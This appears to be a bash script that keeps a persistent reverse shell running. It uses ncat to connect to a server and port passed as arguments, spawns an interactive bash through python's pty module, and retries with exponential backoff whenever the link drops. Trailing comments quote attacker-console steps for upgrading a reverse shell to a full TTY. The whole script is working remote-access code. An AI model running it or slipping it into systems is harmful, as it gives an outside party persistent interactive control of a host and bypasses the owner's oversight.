#!/bin/bash -x
export PS4='Line ${LINENO}: ' # for debug

NC=${NC:-ncat}
type $NC || (
    echo >&2 "$NC cannot be found. Exit."
    exit 1
)
# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess
# coproc { sleep 30 && echo "Output" && exit 3; }
# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished
# COPROC_PID_backup=$COPROC_PID
#
# Retrieving the coprocess's output
# output=$(cat <&$COPROC)
#
# Retrieving the coprocess's exit code
# wait $COPROC_PID_backup
#
# Echoing out the results
# echo $?
# echo $output

echo BASH NOW: $BASHPID

PID_FILE_PATH=/tmp/nc.pid
EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid

test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH

SERVER=$1
shift
PORT=$1
shift

ORIG_PORT=23454
CHECK_PORT=$((ORIG_PORT + 1))

check_exit_status() {
    [ -f /tmp/rvs_return ] && return 0

    if [ -f $EXIT_FILE_PATH ] && [ x"$(cat $EXIT_FILE_PATH)" = x0 ]; then
        return 0
    fi

    return 1 # not ok
}

connect_setup() {
    connect_again_flag=1

    sleep_time=5

    while [ ${connect_again_flag} -eq 1 ]; do
        check_exit_status && return 0

        $NC -w ${1}s -i 1800s $SERVER $PORT -c "echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\"/bin/bash\", \"-li\"])'"

        RSRET=$?
        echo $RSRET >$EXIT_FILE_PATH
        (/bin/ss -lpants | grep "ESTAB.*$PORT") || echo >&2 "\"$NC -w ${1}s -i 1800s $SERVER $PORT\" return with code $RSRET"

        if [ x"$RSRET" = x"0" ]; then
            [ -f /tmp/rvs_exit ] && return 0

            return 255 # just do not return
        fi
        [ $RSRET -eq 0 ] && connect_again_flag=0
        [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))
    done
    # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss
    # thing
    RSRET=1 # just never exit
    echo $RSRET >$EXIT_FILE_PATH && return $RSRET
}

connect_again() {
    # pkill -f "nc.*$PORT"  # no need now, our listen server can accept multiple
    # connection now
    connect_setup $1
}

WAIT_LIMIT=2048
INIT_WAIT=8
port_connect_status=0
wait_time=$INIT_WAIT

floatToInt() {
    parsed=$(printf "%.0f" "$@")
    [ ! $? -eq 0 ] && parsed=0
    echo $parsed
} 2>/dev/null

while true; do
    check_exit_status && exit 0
    # if find that server cannot be connected, we try to restart our reverse connect again
    nc_time=$($(which time) -f "%e" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 >/dev/null)
    nc_ret=$?
    nc_time=$(echo $nc_time | awk '{print $NF}')
    nc_time=$(floatToInt $nc_time)

    if [ ${nc_ret} -eq 0 ]; then
        # recover connection, need to connect_again too. For 1st time, will try to connect
        # no connection last time, have connction now

        if [ $port_connect_status -eq 0 ]; then
            echo "recover connection, reset wait_time and try to reconnect"
            wait_time=$INIT_WAIT
            # previous connection is lost, we wait for longer to setup connection
            check_exit_status || wait_time=15
            connect_again $wait_time &
        else
            wait_time=$((wait_time + wait_time)) # double wait, network fine

            if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
        fi
        port_connect_status=1
    else
        if [ $port_connect_status -eq 1 ]; then
            echo "found connection loss, reset wait_time and try to reconnect"
            wait_time=$INIT_WAIT
            check_exit_status || wait_time=15 # previous connection is lost
            connect_again $wait_time &
        else # no connection all the time? we still try to connect...
            wait_time=$((wait_time + wait_time))

            if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
            connect_again $wait_time &
        fi
        port_connect_status=0
    fi
    sleep $((wait_time - nc_time)) # check every XX seconds
    echo $hostname $HOSTNAME
done

sleep 10
wait # wait for any background

# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
# In reverse shell
# $ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
#
# In Attacker console
# $ stty raw -echo
# $ fg
#
# In reverse shell
# $ reset
# $ export SHELL=bash
# $ export TERM=xterm-256color
# $ stty rows <num> columns <cols>
